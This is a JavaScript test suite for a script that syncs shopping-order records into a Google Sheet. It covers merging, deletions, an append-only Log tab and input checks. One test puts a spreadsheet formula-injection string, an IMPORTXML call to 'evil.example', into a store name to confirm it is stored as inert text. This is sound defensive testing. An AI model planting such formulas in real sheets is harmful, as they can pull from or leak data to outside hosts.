// Runs orders/google-sheet-sync.gs in Node against an in-memory Sheet (the Drinks test's fake-sheet.mjs):
// the secret check, a first sync, the readable Orders tab, newest change winning, and the Log tab, which
// only ever grows: rows from the phone in time order, one row per event id however often it is sent,
// every order kind, deleted orders, text kept as text, and nothing lost when the other tabs are rebuilt.
//   node orders/scripts/sheet-test.mjs
import assert from 'assert/strict';
import path from 'path';
import { fakeSheet } from '../../drinks/scripts/fake-sheet.mjs';

const GS = path.join(path.dirname(new URL(import.meta.url).pathname), '..', 'google-sheet-sync.gs');
const SECRET = 'test-secret-phrase';
let n = 0;
const test = (name, fn) => { fn(); n++; console.log('ok -', name); };
const T = Date.now();
const order = (id, extra) => Object.assign({ id, store: 'Home Depot', kind: 'package', status: 'shipped', items: [{ name: 'Plank flooring', qty: 12 }, { name: 'Underlayment' }], total: 987.21, carrier: 'UPS', tracking: '1Z0000000000000001', eta: '2026-10-05', orderNo: 'WK00000001', updated: T - 1000 }, extra);
const ev = (id, e, o, extra) => Object.assign({ id, at: T, ev: e, note: '', o }, extra);
const sync = (s, body) => s.post(Object.assign({ secret: SECRET, action: 'sync', orders: [], graves: {} }, body));
const LOGHEAD = ['Logged', 'Event', 'Store', 'Kind', 'Items', 'Total', 'Status', 'Carrier', 'Tracking', 'Expected', 'Order number', 'What changed', 'Order ID', 'EventID'];
const mk = () => fakeSheet(GS, SECRET);

test('answers a GET with its name and that it keeps a Log, and refuses a wrong or unset secret', () => {
  const s = mk();
  assert.deepEqual(s.get(), { ok: true, app: 'allison-orders-sync', v: 2, log: 1 });
  assert.equal(s.post({ secret: 'nope', action: 'sync' }).error, 'wrong-secret');
  assert.equal(fakeSheet(GS, 'CHANGE-ME').post({ secret: 'CHANGE-ME', action: 'sync' }).error, 'secret-not-set');
});

test('orders merge as before: the newest change wins, a deletion reaches the other phone, the Orders tab is readable', () => {
  const s = mk();
  assert.equal(sync(s, { orders: [order('a'), order('b', { store: 'Target', kind: 'pickup', status: 'pickup', items: [{ name: 'Lamp' }] })] }).orders.length, 2);
  const r = sync(s, { orders: [order('a', { status: 'delivered', updated: T })] });
  assert.equal(r.orders.find(o => o.id === 'a').status, 'delivered');
  assert.equal(sync(s, { orders: [order('a', { status: 'shipped', updated: T - 5000 })] }).orders.find(o => o.id === 'a').status, 'delivered');
  assert.equal(sync(s, { graves: { 'orders:b': T + 10 } }).orders.length, 1);
  const tab = s.tab('Orders');
  assert.equal(tab[1][1], 'Home Depot'); assert.equal(tab[1][2], '12 x Plank flooring; Underlayment'); assert.equal(tab[1][4], 'Delivered');
});

test('a sync with no log does not make a Log tab, and says nothing was logged', () => {
  const s = mk();
  const r = sync(s, { orders: [order('a')] });
  assert.deepEqual(r.logged, []); assert.equal(s.tab('Log'), null);
});

test('events become Log rows: header, oldest at the top, readable items and status, the id of each one acknowledged', () => {
  const s = mk();
  const r = sync(s, { log: [
    ev('e2', 'Status changed', order('a', { status: 'delivered' }), { at: T + 2000, note: 'Shipped → Delivered' }),
    ev('e1', 'Added', order('a', { status: 'ordered', tracking: undefined }), { at: T + 1000 }),
    ev('e3', 'Left out', { id: 'f1', store: 'Tandoor House', kind: 'food', status: 'ordered', items: [{ name: 'Naan' }], orderNo: 'AB12CD', total: 24.5 }, { at: T + 3000, note: 'The “food” kind is switched off in Settings' }),
  ] });
  assert.deepEqual(r.logged.sort(), ['e1', 'e2', 'e3']);
  const log = s.tab('Log');
  assert.deepEqual(log[0], LOGHEAD);
  assert.deepEqual(log.slice(1).map(x => x[1]), ['Added', 'Status changed', 'Left out'], 'in the order they happened');
  assert.deepEqual(log[2].slice(2, 14), ['Home Depot', 'package', '12 x Plank flooring; Underlayment', 987.21, 'Delivered', 'UPS', '1Z0000000000000001', '2026-10-05', 'WK00000001', 'Shipped → Delivered', 'a', 'e2']);
  assert.ok(log[1][0] instanceof Date && log[1][0].getTime() === T + 1000);
  assert.deepEqual(log[3].slice(2, 8), ['Tandoor House', 'food', 'Naan', 24.5, 'Ordered', ''], 'a kind that is switched off is still logged');
});

test('an event sent twice is written once (and acknowledged both times); a deleted order stays in the Log', () => {
  const s = mk();
  const e = ev('d1', 'Added', order('a'));
  assert.deepEqual(sync(s, { log: [e] }).logged, ['d1']);
  assert.deepEqual(sync(s, { log: [e, ev('d2', 'Deleted', order('a'), { at: T + 5 })] }).logged, ['d1', 'd2']);
  assert.equal(s.tab('Log').length, 3);
  sync(s, { graves: { 'orders:a': T + 10 } });
  assert.equal(s.tab('Orders').length, 1, 'the order is gone from Orders');
  assert.equal(s.tab('Log').length, 3, 'its rows are still in the Log');
});

test('the Log is never rebuilt: rebuilding the other tabs, or syncing from an empty phone, keeps every row', () => {
  const s = mk();
  sync(s, { orders: [order('a')], log: [ev('r1', 'Added', order('a'))] });
  s.rebuild();
  sync(s, { action: 'rebuild' });
  sync(s, { log: [ev('r2', 'Updated', order('a'), { at: T + 9, note: 'Changed: tracking' })] });
  assert.deepEqual(s.tab('Log').slice(1).map(x => x[13]), ['r1', 'r2']);
});

test('text from an email is kept as text: a store starting with = is not a formula, tracking numbers are text columns', () => {
  const s = mk();
  sync(s, { orders: [order('x', { store: '=IMPORTXML("https://evil.example","//a")' })], log: [ev('x1', 'Added', order('x', { store: '=IMPORTXML("https://evil.example","//a")', tracking: '00123456789012' }))] });
  const log = s.tab('Log'), sheet = s.sheets.get('Log');
  assert.equal(log[1][2], '=IMPORTXML("https://evil.example","//a")');
  assert.ok(sheet.raw.includes("'=IMPORTXML(\"https://evil.example\",\"//a\")"), 'written with the text marker');
  assert.equal(log[1][8], '00123456789012');
  assert.ok([...sheet.formats].some(f => f.startsWith('9:@')), 'the tracking column is formatted as text');
  assert.equal(s.sheets.get('Orders').raw.some(v => typeof v === 'string' && v.startsWith('=')), false);
});

test('bad events are skipped, not fatal: no id, junk, more than 500', () => {
  const s = mk();
  const r = sync(s, { log: [null, 5, { at: T }, ev('', 'Added', order('a')), ev('ok1', 'Added', order('a'))] });
  assert.deepEqual(r.logged, ['ok1']);
  const many = Array.from({ length: 520 }, (_, i) => ev('m' + i, 'Added', order('o' + i)));
  assert.equal(sync(s, { log: many }).logged.length, 500);
});

console.log(n + ' tests passed');
